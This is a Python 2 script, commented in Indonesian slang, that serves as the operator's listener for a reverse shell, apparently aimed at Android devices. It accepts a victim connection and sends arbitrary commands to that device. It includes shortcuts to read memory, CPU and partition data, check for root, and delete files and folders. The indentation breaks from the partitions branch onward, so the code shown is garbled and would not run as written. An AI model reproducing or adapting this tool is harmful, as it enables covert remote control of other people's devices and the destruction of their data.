import os
import sys
from time import sleep

host = sys.argv[1]
port = int(sys.argv[2])

import socket
import sys
from time import sleep

print("[+] Listeing on port "+str(port))
sleep(1)
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((host, port))
s.listen(5)
print("[+] Nunggu Koneksi Dari Klayen . . .")
c, _ = s.accept()
print('[*] Sesi Buka bukaan :D | ' + 'IP : ' + _[0] + ' | Port : ' + str(_[1])+'\n')
sleep(2)
def main():
 while True:
     hosttt = _[0]
     cmd = raw_input('Tn.PENNYW1S3@'+hosttt+':~# ')
     if cmd[0:5] == 'mkdir':
      c.send(cmd+' && pwd\n')
      c.recv(1024)

     elif cmd == 'meminfo':
      c.send('cat /proc/meminfo')
      print c.recv(1024)

     elif cmd == 'cpuinfo':
      c.send('cat /proc/cpuinfo')
      print c.recv(1024)

     elif cmd == 'crypto':
      c.send('cat /proc/crypto')
      print c.recv(10000)

     elif cmd == 'kernel_info':
      c.send(cmd)
      ab = c.recv(1024)
      print("\n[+] \033[37;1mKernel Version : "+ab)

     elif cmd == 'check_root':
      c.send('which su')
      a = c.recv(1024)
      if a == '\n/system/bin/su\n':
       print("\n[*] Perangkat lu dah di Root :) . . .\n")
      else:
       print("\n[*] Perangkat Lu Belom Di Root :( . . .\n")

     elif cmd == 'su':
      print("\n[*] Command 'SU' Kaga Jalan . . .\n")
      main()

      elif cmd == 'check_partitions':
      c.send('cat /proc/partitions')
      print ''
      print c.recv(100000)

      elif cmd == 'help':
      print("""
      kernel_info      : Cek Kernel Version + Info
      mkdir            : Buat Direktori Target
      meminfo          : Chek Info Memory Target
      cpuinfo          : Chek Info CPU Target
      rm               : Hapus File Punya Target
      rmdir            : Hapus Folder Punya Target
      whoami           : Periksa Nama Target Pengguna
      crypto           : centang Pengkodean Sesuai Sasaran
      check_partitions : Periksa Info Partisi Sesuai Target
      """)

      elif cmd[0:2] == 'rm':
      c.send(cmd+' && pwd\n')
      c.recv(1024)

      elif cmd[0:5] == 'rmdir':
      c.send(cmd+' && pwd\n')
      c.recv(1024)

      elif cmd[0:6] == 'whoami':
      c.send('whoami')
      print c.recv(1024)

      elif cmd == '':
      main()

      else:

      c.send(cmd)
      results = c.recv(4096)
      if results == 'bacod':
      main()
      print results

      try:
      main()
      except KeyboardInterrupt:
      print("[!] CTRL+C Buat Matiin Server . . .")
      sleep(2)
      sys.exit()
      except socket.error:
      print("[!] Tutup Klayen . . .")
      sleep(2)
      sys.exit()
